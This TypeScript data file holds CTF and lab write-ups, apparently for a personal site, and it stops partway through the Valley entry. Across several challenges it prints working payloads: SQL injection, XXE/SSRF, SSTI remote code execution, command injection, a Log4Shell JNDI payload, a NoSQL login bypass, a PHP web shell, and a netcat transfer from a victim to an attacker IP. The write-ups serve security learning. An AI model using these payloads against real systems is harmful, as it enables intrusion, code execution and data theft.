export interface WriteupSection {
  type: "heading" | "subheading" | "text" | "code" | "flag" | "list" | "image" | "callout";
  content: string;
  items?: string[];
  alt?: string;
}

export interface WriteupData {
  title: string;
  meta: string;
  slug: string;
  baseImageUrl?: string;
  sections: WriteupSection[];
}

export const writeups: Record<string, WriteupData> = {
  "graph-grief": {
    title: "Graph Grief",
    meta: "NiteCTF • Web • syndro • 6 solves",
    slug: "graph-grief",
    baseImageUrl: "/CTF/Nite2025/",
    sections: [
      { type: "heading", content: "0. Description" },
      { type: "image", content: "Pic/0.png", alt: "Description" },
      { type: "heading", content: "1. Initial Access and Observations" },
      { type: "text", content: "Upon accessing the target, we are presented with AetherCorp's landing page showcasing their \"Hyper-Graph Technology\" API. The page prominently features GraphQL syntax in its demo code blocks and marketing copy, directly comparing their solution to traditional REST APIs." },
      { type: "image", content: "Pic/1.png", alt: "AetherCorp landing page with GraphQL demos" },
      { type: "text", content: "Key observation: The page explicitly states \"Traditional REST APIs are linear,\" highlighting the limitation of requiring multiple sequential requests to fetch related data." },
      { type: "image", content: "Pic/2.png", alt: "REST limitations highlighted on the landing page" },
      { type: "text", content: "The REST vs GraphQL Difference  - With traditional REST APIs, accessing nested resources requires chained requests:" },
      { type: "code", content: "GET /books/1                # First, get the book\nGET /authors/1              # Then, get the author separately" },
      { type: "text", content: "GraphQL solves this efficiently with a single query:" },
      { type: "code", content: "query {\n  book(id: \"1\") {\n    title\n    author {\n      firstName\n      lastName\n    }\n  }\n}" },
      { type: "text", content: "Returning to the challenge: The name \"Graph Grief,\" combined with the visible API and GraphQL-like sample queries on the frontend, strongly suggests we are dealing with a GraphQL endpoint." },
      { type: "heading", content: "2. Discovering the GraphQL Endpoint" },
      { type: "text", content: "We begin enumerating common GraphQL paths:" },
      { type: "code", content: "/v1/explorer\n/v1/graphiql\n/graph\n/graphql\n/graphql/console\n/graphql.php\n/graphiql\n/graphiql.php" },
      { type: "text", content: "We successfully locate the functional endpoint at /graphql. This marks the beginning of the real challenge." },
      { type: "image", content: "Pic/3.png", alt: "GraphQL endpoint discovered at /graphql" },
      { type: "text", content: "I opted to use ZAP for interacting with the endpoint, manually modifying the request body  - I find this faster and more flexible." },
      { type: "image", content: "Pic/4.png", alt: "Interacting with GraphQL via ZAP" },
      { type: "heading", content: "3. Introspection Attempt" },
      { type: "text", content: "With direct access to the GraphQL interface, the first step is to reveal the full schema via introspection." },
      { type: "image", content: "Pic/5.png", alt: "Attempting standard introspection" },
      { type: "text", content: "Introspection is disabled  - queries for __schema or __type fail. However, the error message is quite revealing:" },
      { type: "code", content: "\"Field \\\"__schema\\\" of type \\\"__Schema!\\\" must have a selection of subfields. Did you mean \\\"__schema { ... }\\\"?\"" },
      { type: "text", content: "There are two viable approaches from here:" },
      { type: "list", content: "", items: [
        "Blind schema guessing using a GraphQL wordlist (highly recommended).",
        "Leveraging an alternative vulnerability path (the one I followed)."
      ]},
      { type: "heading", content: "4. Pivoting to XML Content Type" },
      { type: "text", content: "The landing page contains subtle but critical hints:" },
      { type: "image", content: "Pic/7.png", alt: "Developer notes on the landing page" },
      { type: "code", content: "Full support for application/json and application/xml\nDetailed error messages that definitely don't leak stack traces\nDeveloper Note: Legacy XML importer may trigger internal file utilities." },
      { type: "text", content: "We switch to XML by setting Content-Type: application/xml and test basic entity expansion:" },
      { type: "code", content: "<?xml version=\"1.0\" ?>\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n<userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n</userInfo>" },
      { type: "text", content: "The entity is reflected successfully  - XML processing is active and vulnerable to entity injection." },
      { type: "image", content: "Pic/8.png", alt: "Successful basic XXE entity reflection" },
      { type: "heading", content: "5. Exploring XXE Capabilities" },
      { type: "text", content: "Attempting to read local files directly proves unsuccessful  - general entities (file://) are blocked." },
      { type: "image", content: "Pic/9.png", alt: "General entities blocked" },
      { type: "text", content: "The hints \"Legacy XML\" and the era around 1999 point toward SOAP (Simple Object Access Protocol). We craft a SOAP-style payload to probe internal services." },
      { type: "image", content: "Pic/10.png", alt: "Initial SOAP payload attempt" },
      { type: "text", content: "To bypass potential localhost filters, we use the decimal representation of 127.0.0.1: 2130706433. Testing common ports (8080, 5432, 3000, 8000, 4200), we get a response on port 8000." },
      { type: "image", content: "Pic/12.png", alt: "Connection established to internal service on port 8000" },
      { type: "heading", content: "6. Leaking the GraphQL Schema" },
      { type: "text", content: "We enumerate deeper paths and discover /internal/file." },
      { type: "image", content: "Pic/13.png", alt: "Path enumeration" },
      { type: "image", content: "Pic/Dev.png", alt: "Developer note" },
      { type: "text", content: "Final payload:" },
      { type: "code", content: "<soap:Body>\n<!ENTITY % dtd SYSTEM \"http://2130706433:8000/internal/file?name=schema.graphql\">\n%dtd;\n</soap:Body>" },
      { type: "image", content: "Pic/14.png", alt: "Schema successfully leaked" },
      { type: "text", content: "The leaked schema reveals a secret type with id, hint, flag, and level fields  - implementing the Node interface." },
      { type: "code", content: "type secret implements Node {\n  id: ID!\n  hint: String\n  flag: String\n  level: String\n}\n\ntype Query {\n  about: String\n  products: [Product]\n  users: [User]\n  profiles: [Profile]\n  orders: [Order]\n  auditLogs: [AuditLog]\n  node(id: ID!): Node\n}" },
      { type: "heading", content: "7. Accessing the Secret Node" },
      { type: "text", content: "Dumping auditLogs reveals a reference to secret:flag. All IDs are Base64-encoded." },
      { type: "code", content: "{\n  \"query\" : \"query {auditLogs {id action actorId targetNodeId timestamp details}}\"\n}" },
      { type: "image", content: "Pic/15.png", alt: "Audit logs revealing secret node reference" },
      { type: "text", content: "Testing: secret:flag → returns null. But c2VjcmV0OmZsYWc= (Base64 of \"secret:flag\") → returns the object. The flag field is redacted  - authorization required." },
      { type: "image", content: "Pic/17.png", alt: "Direct query with raw ID fails" },
      { type: "image", content: "Pic/18.png", alt: "Base64-encoded ID succeeds, but flag is hidden" },
      { type: "image", content: "Pic/19.png", alt: "Re-examining audit logs for clues" },
      { type: "heading", content: "8. Authorization Bypass via Internal Endpoint" },
      { type: "text", content: "Since we already reach an internal service on port 8000, we proxy our query through the XXE vector:" },
      { type: "code", content: "<soap:Body>\n<!ENTITY % dtd SYSTEM \"http://2130706433:8000/internal/graphql?query=query{node(id:%22c2VjcmV0OmZsYWc=%22){__typename ...on secret{id hint level flag}}}\">\n%dtd;\n</soap:Body>" },
      { type: "text", content: "And there it is  - the flag, unrestricted." },
      { type: "image", content: "Pic/21.png", alt: "Flag retrieved via internal GraphQL endpoint" },
      { type: "flag", content: "nite{REDACTED}" },
      { type: "text", content: "god, i hate this challenge so much." },
    ],
  },
  "database-reincursion": {
    title: "Database Reincursion",
    meta: "NiteCTF • Web • syndro",
    slug: "database-reincursion",
    baseImageUrl: "/CTF/Nite2025/",
    sections: [
      { type: "heading", content: "0. Challenge Description" },
      { type: "text", content: "A classic case of intern-level security oversights." },
      { type: "image", content: "1.png", alt: "Description" },
      { type: "heading", content: "1. Login Page" },
      { type: "text", content: "Upon accessing the site, we are presented with a login form." },
      { type: "image", content: "2.png", alt: "Login page" },
      { type: "text", content: "A standard SQL injection attempt like ' OR 1=1-- is immediately blocked by a filter." },
      { type: "image", content: "3.png", alt: "Filter" },
      { type: "text", content: "After testing several payloads, the following prove effective in bypassing the filter:" },
      { type: "code", content: "' OR 1=1--  -> Blocked\n' OR 1=1/*  -> Blocked\n1' IS NOT '2'/*  -> Works\n'|| Username /*  -> Works" },
      { type: "text", content: "Using either of the last two payloads successfully logs us in." },
      { type: "heading", content: "2. Employees Directory" },
      { type: "text", content: "Once inside, we see a search bar for employees along with a field for an Admin Passcode." },
      { type: "image", content: "4.png", alt: "Dashboard" },
      { type: "text", content: "A helpful note mentions: \"I heard Kiwi from Management has the passcode\"" },
      { type: "image", content: "5.png", alt: "Hint" },
      { type: "text", content: "Searching for \"Kiwi\" alone yields no results." },
      { type: "image", content: "6.png", alt: "Kiwi search" },
      { type: "text", content: "Since the hint specifies \"from Management,\" we combine:" },
      { type: "code", content: "Kiwi' AND Department=\"Management\"/*" },
      { type: "text", content: "This reveals the passcode." },
      { type: "image", content: "7.png", alt: "Passcode" },
      { type: "heading", content: "3. Admin Panel" },
      { type: "image", content: "8.png", alt: "Admin dashboard" },
      { type: "text", content: "At the bottom of the admin page, there's a \"Metadata Registry\" listing database tables  - one of which is redacted, strongly suggesting it contains the flag." },
      { type: "text", content: "We can exploit a UNION-based injection to query the metadata table directly:" },
      { type: "code", content: "' UNION SELECT * FROM metadata/*" },
      { type: "image", content: "9.png", alt: "Data tables" },
      { type: "text", content: "This exposes the hidden table name: CITADEL_ARCHIVE_2077." },
      { type: "text", content: "Next, we determine the column count by testing UNION queries:" },
      { type: "code", content: "' UNION SELECT 1 FROM CITADEL_ARCHIVE_2077/*       -> Error\n' UNION SELECT 1,2 FROM CITADEL_ARCHIVE_2077/*     -> Error\n' UNION SELECT 1,2,3 FROM CITADEL_ARCHIVE_2077/*   -> Error\n' UNION SELECT 1,2,3,4 FROM CITADEL_ARCHIVE_2077/* -> Valid\n' UNION SELECT 1,2,3,4,5 FROM CITADEL_ARCHIVE_2077/* -> Error" },
      { type: "image", content: "10.png", alt: "Error column number" },
      { type: "image", content: "11.png", alt: "Correct column number" },
      { type: "text", content: "The table has exactly 4 columns. We dump the contents:" },
      { type: "code", content: "' UNION SELECT *,2,3,4 FROM CITADEL_ARCHIVE_2077/*" },
      { type: "image", content: "12.png", alt: "Flag!" },
      { type: "flag", content: "nite{neVeR_9Onn4_****}" },
      { type: "text", content: "(P.S. The employee names are Cyberpunk references  - I both love and hate the author for that.)" },
    ],
  },
  "trust-fall": {
    title: "Trust Fall",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "trust-fall",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much really." },
      { type: "image", content: "Pic/TrustFall/1.png", alt: "Challenge banner" },
      { type: "heading", content: "1. The Login Page" },
      { type: "text", content: "From the get-go, we have zero info  - just username & password placeholders." },
      { type: "image", content: "Pic/TrustFall/2.png", alt: "Login screen" },
      { type: "text", content: "Tried classic SQLi to log in as the first user (usually admin) → didn't work. Inspected source, Network tab → both useless." },
      { type: "heading", content: "2. The Dashboard" },
      { type: "text", content: "So I just logged in with the placeholder values." },
      { type: "image", content: "Pic/TrustFall/3.png", alt: "Main dashboard" },
      { type: "text", content: "Welcome page with products and an \"Admin Console\" button  - obviously our target. Clicking it → 403 Forbidden." },
      { type: "text", content: "Noticed a signed session cookie. Modifying it is impossible without the secret, so I just deleted the cookie entirely → Admin Console is accessible!" },
      { type: "text", content: "…but it's there just for the UI. Pure UX garbage." },
      { type: "image", content: "Pic/TrustFall/4.png", alt: "Dummy admin source" },
      { type: "heading", content: "3. Checking the APIs/Assets" },
      { type: "text", content: "Network tab shows static files being loaded from /assets/." },
      { type: "image", content: "Pic/TrustFall/5.png", alt: "Assets from IP/assets/ITEM" },
      { type: "text", content: "We can directly access /assets/anything and it works. Tried ffuf on /assets/ → no hidden dirs." },
      { type: "text", content: "Then I looked at the API call for products  - same pattern. Maybe the API is also exposed and fuzzable?" },
      { type: "image", content: "Pic/TrustFall/6.png", alt: "Products API call" },
      { type: "heading", content: "4. ZAP Directory Fuzzing" },
      { type: "text", content: "Used an API endpoint wordlist. Set up ZAP fuzzer  - select \"products\" → Add → Strings → Paste payload." },
      { type: "image", content: "Pic/TrustFall/7.png", alt: "ZAP fuzz setup" },
      { type: "text", content: "Any page other than the product page redirects to login. Added a Message Processor tag filter: Regex: Found → Tag: Bad." },
      { type: "image", content: "Pic/TrustFall/8.png", alt: "Filter out /login redirects" },
      { type: "text", content: "Found /users endpoint!" },
      { type: "image", content: "Pic/TrustFall/9.png", alt: "Found /users endpoint" },
      { type: "heading", content: "5. THE FLAG" },
      { type: "text", content: "/users exists! Trying /users/1, /users/2 → normal users." },
      { type: "image", content: "Pic/TrustFall/11.png", alt: "Invalid ID message" },
      { type: "text", content: "But /users/0 is usually the root/admin user. So we try it and there it is!" },
      { type: "image", content: "Pic/TrustFall/12.png", alt: "Flag at user 0" },
      { type: "flag", content: "PCTF{auth_****}" },
      { type: "text", content: "Well, could've been easier if we just guessed \"users\" API lol" },
    ],
  },
  "trust-vault": {
    title: "Trust Vault",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "trust-vault",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The description gives us hints: Jinja2 template + vulnerable SQL query → SQLi into SSTI payload." },
      { type: "image", content: "Pic/Trustvault/1.png", alt: "Challenge description" },
      { type: "heading", content: "1. The Challenge Page" },
      { type: "text", content: "Register → login → dashboard with four tabs. Only Bookmarks is useful." },
      { type: "text", content: "Adding \"{{7*7}}\" as a bookmark → reflected as plain text. Not rendered." },
      { type: "image", content: "Pic/Trustvault/2.png", alt: "Plain text reflection" },
      { type: "text", content: "View source on Bookmarks tab → hidden comment:" },
      { type: "code", content: "<!-- <p>Legacy console: <a href=\"/search\">/search</a></p> -->" },
      { type: "text", content: "Visit /search → renders all bookmarks as Jinja2 templates! Test {{7*7}} → 49 → Jinja confirmed." },
      { type: "image", content: "Pic/Trustvault/3.png", alt: "Jinja confirmed" },
      { type: "heading", content: "2. SSTI Embedded inside SQLi" },
      { type: "text", content: "Bookmarks are stored via raw SQL → inject SSTI payload directly into the database." },
      { type: "text", content: "First, let's try to list directories:" },
      { type: "code", content: "' UNION SELECT \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}\" --" },
      { type: "text", content: "Successfully get directories back." },
      { type: "image", content: "Pic/Trustvault/4.png", alt: "ls output" },
      { type: "text", content: "Final lazy payload:" },
      { type: "code", content: "' UNION SELECT \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings * | grep -i pctf{').read() }}\" --" },
      { type: "text", content: "Visit /search → flag printed instantly." },
      { type: "image", content: "Pic/Trustvault/5.png", alt: "Flag revealed" },
      { type: "flag", content: "PCTF{SQLi_****}" },
      { type: "text", content: "SQLi + SSTI." },
    ],
  },
  "connection-tester": {
    title: "Connection Tester",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "connection-tester",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much in the challenge description." },
      { type: "image", content: "Pic/ConnectionTester/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. Login Page – SQL Injection" },
      { type: "text", content: "The challenge starts with a simple login form." },
      { type: "image", content: "Pic/ConnectionTester/2.png", alt: "Login form" },
      { type: "text", content: "Basic SQL Injection:" },
      { type: "code", content: "Username: ' OR 1=1--\nPassword: anything" },
      { type: "text", content: "Resulting Query:" },
      { type: "code", content: "SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';" },
      { type: "text", content: "1=1 is ALWAYS TRUE, so the payload returns true and logs us in as admin. And -- comments everything afterwards." },
      { type: "image", content: "Pic/ConnectionTester/3.png", alt: "Logged in as admin" },
      { type: "heading", content: "2. Dashboard – The Ping Tool" },
      { type: "text", content: "Once logged in, we get a \"Test Connection\" feature that pings any host we enter. Trying 127.0.0.1 returns output → Maybe it's just shell execution on the backend?" },
      { type: "image", content: "Pic/ConnectionTester/4.png", alt: "Ping localhost" },
      { type: "heading", content: "3. Discovering the Injection Point" },
      { type: "text", content: "The backend likely runs: /bin/sh -c \"ping -c user_input\". Normal separators like ; or | are treated as ping arguments. But & and && work!" },
      { type: "text", content: "Commands like ls, pwd, cat are not built-in shell. But we can use echo with command substitution:" },
      { type: "code", content: "echo \"$(command)\"\n# The $ returns the variable of the input inside of it.\n# so echo \"$(ls)\" would return the directory list!" },
      { type: "heading", content: "4. Listing Files" },
      { type: "code", content: "127.0.0.1 & echo \"$(ls)\"" },
      { type: "image", content: "Pic/ConnectionTester/5.png", alt: "Listing files" },
      { type: "text", content: "→ Reveals flag.txt" },
      { type: "heading", content: "5. Reading the Flag" },
      { type: "code", content: "127.0.0.1 & echo \"$(cat flag.txt)\"" },
      { type: "image", content: "Pic/ConnectionTester/6.png", alt: "Flag revealed" },
      { type: "flag", content: "PCTF{C0nnection_****}" },
      { type: "text", content: "Oh well, that was easy." },
    ],
  },
  "feedback-fallout": {
    title: "Feedback Fallout",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "feedback-fallout",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The challenge description mentions an old Java version, which could be an old exploit." },
      { type: "image", content: "Pic/FeedbackFallout/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. The Feedback Page" },
      { type: "text", content: "Nothing other than a simple feedback Textarea. Inspected source and Network tab → nothing useful." },
      { type: "image", content: "Pic/FeedbackFallout/2.png", alt: "Feedback form" },
      { type: "heading", content: "2. Discovering the Vulnerability" },
      { type: "text", content: "Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response." },
      { type: "image", content: "Pic/FeedbackFallout/3.png", alt: "ZAP intercept" },
      { type: "text", content: "\"Logs four\" at the bottom of the feedback page  - hint leading to Log4Shell (CVE-2021-44228)." },
      { type: "image", content: "Pic/FeedbackFallout/6.png", alt: "Challenge hint" },
      { type: "text", content: "Tried to get a reverse shell using Marshalsec:" },
      { type: "code", content: "How MarshalSec works:\n1 - You have a netcat listener on your Attacker Machine\n2 - You set up a SimpleHTTPServer (Python)\n3 - You set up an LDAP server using Marshalsec\n4 - You host an old-version Java .class with reverse shell\n5 - You send a JNDI/ldap to access that Exploit.class\n6 - Final Payload: ${jndi:ldap//YOUR-IP:1389/Exploit.class}" },
      { type: "text", content: "JNDI never worked. Tried basic syntax instead:" },
      { type: "code", content: "${java:version}" },
      { type: "image", content: "Pic/FeedbackFallout/4.png", alt: "Java version leaked" },
      { type: "text", content: "Java still leaks info! Since JNDI is disabled, brute-force ${env:KEY}:" },
      { type: "code", content: "Common syntaxes:\n- ${sys:os.name}\n- ${sys:user.name}\n- ${env:PATH}\n- ${env:HOSTNAME}\n- ${java:version}" },
      { type: "heading", content: "3. The Exploit" },
      { type: "text", content: "Quick for-loop to brute-force common env variable names:" },
      { type: "code", content: "for i in Admin admin ADMIN FLAG FLAG_CTF SECRET KEY SECRET_FLAG flag secret; do\n  echo \"Trying \\${env:$i}\"\n  curl -s -X POST http://TARGET:8080/feedback \\\n    -H \"Content-Type: application/x-www-form-urlencoded;charset=UTF-8\" \\\n    -d \"feedback=\\${env:$i}\" | grep -o \"User .*\"\ndone" },
      { type: "image", content: "Pic/FeedbackFallout/5.png", alt: "Flag found" },
      { type: "flag", content: "PCTF{cant_****}" },
      { type: "text", content: "Log4Shell." },
    ],
  },
  "secureauth": {
    title: "SecureAuth™",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "secureauth",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much in challenge description." },
      { type: "image", content: "Pic/SecureAuth/1.png", alt: "SecureAuth banner" },
      { type: "heading", content: "1. Initial Login Page" },
      { type: "text", content: "We're greeted by a JSON-based login form. Content-Type: application/json  - AKA, NoSQL Injection." },
      { type: "image", content: "Pic/SecureAuth/7.png", alt: "Login page" },
      { type: "text", content: "Tried the classic NoSQLi payload in the browser:" },
      { type: "code", content: "Username: admin\nPassword: {\"$ne\": null}" },
      { type: "text", content: "→ Didn't work. The payload was being sent as a string." },
      { type: "heading", content: "2. Using Burp/ZAP" },
      { type: "text", content: "Direct access to /api/authenticate gave \"Method Not Allowed\". Switched to POST and added the proper Content-Type header." },
      { type: "image", content: "Pic/SecureAuth/2.png", alt: "Method not allowed" },
      { type: "image", content: "Pic/SecureAuth/3.png", alt: "Fixed request with POST + Content-Type" },
      { type: "heading", content: "3. Crafting the Real Payload" },
      { type: "text", content: "The challenge literally tells us the backend structure. So we send the $ne operator outside the quotes:" },
      { type: "image", content: "Pic/SecureAuth/4.png", alt: "Hint in source" },
      { type: "image", content: "Pic/SecureAuth/5.png", alt: "Final payload in Burp" },
      { type: "heading", content: "4. Profits!" },
      { type: "text", content: "Bypassed authentication and got the flag instantly." },
      { type: "image", content: "Pic/SecureAuth/6.png", alt: "Flag revealed" },
      { type: "heading", content: "5. One-liner with cURL" },
      { type: "code", content: "curl -X POST http://TARGET:5200/api/authenticate \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":{\"$ne\":null},\"remember\":\"false\"}'" },
      { type: "flag", content: "FLAG{py7h0n_****}" },
      { type: "text", content: "\"SecureAuth™\"  - yeah, sure." },
    ],
  },
  "reverse-metadata-1": {
    title: "Reverse Metadata Part 1",
    meta: "PatriotCTF 2025 • Misc • syndro",
    slug: "reverse-metadata-1",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The image description mentions a hidden vulnerability in metadata  - we can sneak a PHP code into an image or a .php file and it gets executed." },
      { type: "image", content: "Pic/ReverseMetadataPart1/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. The Upload Form" },
      { type: "text", content: "A very simple image upload page with no client-side filtering in the source code." },
      { type: "image", content: "Pic/ReverseMetadataPart1/2.png", alt: "Upload form" },
      { type: "image", content: "Pic/ReverseMetadataPart1/3.png", alt: "Source code" },
      { type: "text", content: "Uploaded a PHP shell:" },
      { type: "code", content: "<html>\n<body>\n  <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n  <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n  <input type=\"SUBMIT\" value=\"Execute\">\n  </form>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd'] . ' 2>&1');\n    }\n?>\n</body>\n</html>" },
      { type: "heading", content: "2. Uploading a PHP Shell" },
      { type: "text", content: "Upload successful  - shell execution works!" },
      { type: "image", content: "Pic/ReverseMetadataPart1/4.png", alt: "Upload success" },
      { type: "image", content: "Pic/ReverseMetadataPart1/5.png", alt: "Shell execution" },
      { type: "heading", content: "3. Finding the Flag" },
      { type: "text", content: "With the shell, we list the directory and read the flag:" },
      { type: "code", content: "ls -la\ncat flag2.txt" },
      { type: "image", content: "Pic/ReverseMetadataPart1/6.png", alt: "Flag captured" },
      { type: "flag", content: "MASONCC{images_****}" },
      { type: "text", content: "Never trust an image upload." },
    ],
  },
  "reverse-metadata-2": {
    title: "Reverse Metadata Part 2",
    meta: "PatriotCTF 2025 • Misc • syndro",
    slug: "reverse-metadata-2",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "Pretty much the same as Part 1, but different flag location." },
      { type: "image", content: "Pic/ReverseMetadataPart2/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. Same Vulnerability, New Location" },
      { type: "text", content: "We upload our PHP shell syndro.php and get instant RCE again." },
      { type: "code", content: "<html>\n<body>\n  <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n  <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n  <input type=\"SUBMIT\" value=\"Execute\">\n  </form>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd'] . ' 2>&1');\n    }\n?>\n</body>\n</html>" },
      { type: "heading", content: "2. Exploring the Filesystem" },
      { type: "text", content: "The uploads directory is empty except our shell. Time to break out:" },
      { type: "code", content: "ls -la ../../" },
      { type: "image", content: "Pic/ReverseMetadataPart2/2.png", alt: "Navigating upwards" },
      { type: "image", content: "Pic/ReverseMetadataPart2/3.png", alt: "Found log directory" },
      { type: "heading", content: "3. The Winning Move" },
      { type: "text", content: "Inside processes.log we finally spot the flag:" },
      { type: "code", content: "strings ../../../log/ctf-monitor/processes.log | grep -i \"pctf{\"" },
      { type: "image", content: "Pic/ReverseMetadataPart2/4.png", alt: "Flag found" },
      { type: "flag", content: "PCTF{hidden_****}" },
      { type: "text", content: "Always check logs. They remember everything." },
    ],
  },
  "valley": {
    title: "Valley",
    meta: "TryHackMe • Linux • Easy",
    slug: "valley",
    baseImageUrl: "/labs/Tryhackme/Valley/",
    sections: [
      { type: "heading", content: "Goal" },
      { type: "list", content: "", items: [
        "What is the user flag?",
        "What is the root flag?"
      ]},
      { type: "text", content: "Target: 10.80.184.98" },
      { type: "text", content: "This writeup follows the simplest path: start with full recon, pivot through the web app to get FTP access, extract SSH creds from a PCAP, then escalate to root through a writable Python library used by a root cron job." },
      { type: "image", content: "Pasted image 20260216181134.png", alt: "Initial enumeration screenshot" },

      { type: "heading", content: "1) Recon (Nmap)" },
      { type: "text", content: "First step is always service discovery: identify what's exposed and what's worth enumerating." },
      { type: "code", content: "nmap -sV -r -T4 -Pn -p- -oN nmap1.nmap 10.80.184.98 -v" },
      { type: "image", content: "Pasted image 20260216181740.png", alt: "Nmap results screenshot" },
      { type: "callout", content: "Key findings: 22 (SSH)  - likely final access later • 80 (HTTP)  - main attack surface for creds / hints • 37370 (FTP on a non-standard port)  - probably contains files we need" },

      { type: "heading", content: "2) Web Enumeration (FFUF)" },
      { type: "text", content: "Next, brute-force directories to discover hidden routes and developer leftovers." },
      { type: "code", content: "ffuf -u http://10.80.184.98/FUZZ \\\n-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n-fc 404 -s" },
      { type: "image", content: "Pasted image 20260216182149.png", alt: "FFUF results screenshot" },
      { type: "text", content: "We discover multiple routes. /gallery and /static look normal for the site, while /pricing is interesting because it contains internal files." },
      { type: "image", content: "Pasted image 20260216182248.png", alt: "Pricing directory listing screenshot" },
      { type: "text", content: "note.txt:" },
      { type: "image", content: "Pasted image 20260216182258.png", alt: "note.txt content screenshot" },

      { type: "heading", content: "3) FTP (Anonymous attempt)" },
      { type: "text", content: "FTP is running on port 37370, so we try a basic login first. No luck: it requires credentials." },
      { type: "code", content: "ftp 10.80.184.98 37370" },
      { type: "image", content: "Pasted image 20260216182452.png", alt: "FTP anonymous attempt screenshot" },
      { type: "callout", content: "Pointer: when a service blocks anonymous access, the creds usually come from the web app (hardcoded JS, leaked configs, backups, dev panels)." },

      { type: "heading", content: "4) Deeper Enumeration (static → dev)" },
      { type: "text", content: "With FTP blocked, we keep digging on the website. Eventually we find a clue inside /static that leads to a hidden dev area." },
      { type: "image", content: "Pasted image 20260216183127.png", alt: "Further enumeration screenshot" },
      { type: "text", content: "We spot \"00\" under /static/fuzz:" },
      { type: "image", content: "Pasted image 20260216183159.png", alt: "Static 00 discovery screenshot" },

      { type: "heading", content: "5) Hidden Dev Login (/dev)" },
      { type: "image", content: "Pasted image 20260216183243.png", alt: "/dev login page screenshot" },
      { type: "text", content: "The /dev page is a login portal. Instead of guessing, check the page source. A referenced script (/dev.js) contains the validation logic on the client side, which means credentials can be exposed." },
      { type: "image", content: "Pasted image 20260216183426.png", alt: "dev.js screenshot" },
      { type: "callout", content: "Creds found in dev.js: Username: siemDev • Password: california" },
      { type: "text", content: "After logging in, we get a note  - the important hint is: \"Stop reusing credentials\". That's a strong signal to try the same creds on other services (FTP/SSH/etc)." },
      { type: "image", content: "Pasted image 20260216183539.png", alt: "Dev note screenshot" },

      { type: "heading", content: "6) FTP (Authenticated)" },
      { type: "text", content: "Use the dev creds on FTP. It works." },
      { type: "code", content: "ftp 10.80.184.98 37370" },
      { type: "image", content: "Pasted image 20260216183656.png", alt: "FTP login success screenshot" },
      { type: "text", content: "Listing the directory shows three Wireshark capture files (.pcapng). Download them locally and inspect in Wireshark." },
      { type: "image", content: "Pasted image 20260216183833.png", alt: "FTP dir listing screenshot" },
      { type: "code", content: "dir\nget file1.pcapng\nget file2.pcapng\nget file3.pcapng" },

      { type: "heading", content: "7) PCAP Analysis (Wireshark)" },
      { type: "text", content: "Open the captures and focus on credential-bearing traffic. Filtering POST requests is a quick win:" },
      { type: "code", content: "http.request.method == \"POST\"" },
      { type: "image", content: "Pasted image 20260216184147.png", alt: "Wireshark credentials screenshot" },
      { type: "callout", content: "SSH creds recovered from PCAP: Username: valleyDev • Password: ph0t0s1234" },

      { type: "heading", content: "8) SSH (User flag)" },
      { type: "text", content: "Login with the recovered credentials:" },
      { type: "code", content: "ssh valleyDev@10.80.184.98" },
      { type: "image", content: "Pasted image 20260216184409.png", alt: "SSH login / user flag screenshot" },
      { type: "text", content: "At this point, the user flag is available. Next goal: root." },

      { type: "heading", content: "9) Privilege Escalation (Part 1  - valleyAuthenticator)" },
      { type: "text", content: "Basic checks first:" },
      { type: "code", content: "sudo -l\nsudo -i" },
      { type: "text", content: "No sudo permissions, so we enumerate the filesystem manually. In /home, we find a binary: valleyAuthenticator. It prompts for credentials, so we pull it locally and reverse it." },
      { type: "code", content: "# On your local machine:\nnc -lp 1234 > valleyAuthenticator\n\n# On the victim machine:\nnc 192.168.184.65 1234 < valleyAuthenticator" },
      { type: "text", content: "The binary is packed, so unpack it with UPX, then open in Ghidra:" },
      { type: "code", content: "upx -d valleyAuthenticator" },
      { type: "image", content: "Pasted image 20260216190718.png", alt: "Ghidra analysis screenshot" },
      { type: "text", content: "In the decompiled output we find two MD5 hashes (one for username, one for password). Cracking them (e.g., CrackStation) reveals:" },
      { type: "image", content: "Pasted image 20260216190852.png", alt: "Cracked MD5 screenshot" },
      { type: "callout", content: "Cracked creds: Username: valley • Password: liberty123" },
      { type: "text", content: "The authenticator prints \"authenticated\", so the creds are valid somewhere. SSH:" },
      { type: "code", content: "ssh valley@10.80.184.98" },

